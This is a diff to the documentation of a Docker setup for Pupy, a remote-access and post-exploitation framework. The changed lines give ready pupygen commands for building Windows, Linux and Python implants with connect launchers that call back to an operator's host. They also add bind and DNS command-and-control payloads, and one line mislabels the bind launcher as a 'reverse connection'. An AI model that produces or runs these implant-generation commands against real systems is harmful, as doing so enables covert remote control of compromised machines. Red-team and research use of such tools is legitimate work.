@@ -86,22 +86,28 @@ docker-compose run --rm pupy-server pupysh -l ssl 443 -l http 80
 
 ### Payload Generator (pupygen)
 
-**Generate Windows payload:**
+**Generate Windows payload with connect launcher:**
 
 ```bash
-docker-compose run --rm pupy-generator pupygen -O windows -A x64 -o ./output/payload.exe
+docker-compose run --rm pupy-generator pupygen -O windows -A x64 -o ./output/payload.exe connect -c <host:port> -t ssl
 ```
 
-**Generate Linux payload:**
+**Generate Linux payload with connect launcher:**
 
 ```bash
-docker-compose run --rm pupy-generator pupygen -O linux -A x64 -o ./output/payload.lin
+docker-compose run --rm pupy-generator pupygen -O linux -A x64 -o ./output/payload.lin connect -c <host:port> -t ssl
 ```
 
-**Generate Python payload:**
+**Generate Python payload with connect launcher:**
 
 ```bash
-docker-compose run --rm pupy-generator pupygen -f py -o ./output/payload.py
+docker-compose run --rm pupy-generator pupygen -f py -o ./output/payload.py connect -c <host:port> -t ssl
+```
+
+**Replace** `<host:port>` **with your actual server IP and port, for example:**
+
+```bash
+docker-compose run --rm pupy-generator pupygen -O linux -A x64 -o ./output/payload.lin connect -c 192.168.1.100:443 -t ssl
 ```
 
 **List available options:**
@@ -114,7 +120,7 @@ docker-compose run --rm pupy-generator pupygen -l
 
 Pupy uses Python's module system:
 
-- `python -m pupy.cli` runs pupysh (via __main__.py)
+- `python -m pupy.cli` runs pupysh (via **main**.py)
 - `python -m pupy.cli.pupygen` runs pupygen module
 - Both commands properly set up the Python path and imports
 
@@ -180,14 +186,20 @@ docker-compose logs -f pupy-server
 ### Generate Payloads
 
 ```bash
-# Windows 64-bit executable
-docker-compose run --rm pupy-generator pupygen -O windows -A x64 -o ./output/win64.exe
+# Windows 64-bit executable with connect launcher
+docker-compose run --rm pupy-generator pupygen -O windows -A x64 -o ./output/win64.exe connect -c YOUR_IP:443 -t ssl
 
-# Linux 64-bit with custom transport
-docker-compose run --rm pupy-generator pupygen -O linux -A x64 -t ssl --host YOUR_IP:443 -o ./output/linux64
+# Linux 64-bit with connect launcher and ssl transport
+docker-compose run --rm pupy-generator pupygen -O linux -A x64 -o ./output/linux64 connect -c YOUR_IP:443 -t ssl
 
-# Python oneliner
-docker-compose run --rm pupy-generator pupygen -f py_oneliner -t ssl --host YOUR_IP:443
+# Python oneliner with connect launcher
+docker-compose run --rm pupy-generator pupygen -f py_oneliner connect -c YOUR_IP:443 -t ssl
+
+# Using bind launcher (reverse connection)
+docker-compose run --rm pupy-generator pupygen -O windows -A x64 -o ./output/win64_bind.exe bind -p 8443 -t ssl
+
+# Using dnscnc launcher (DNS Command & Control)
+docker-compose run --rm pupy-generator pupygen -O linux -A x64 -o ./output/linux64_dns dnscnc --domain yourdomain.com
 ```
 
 ### Interactive Shell
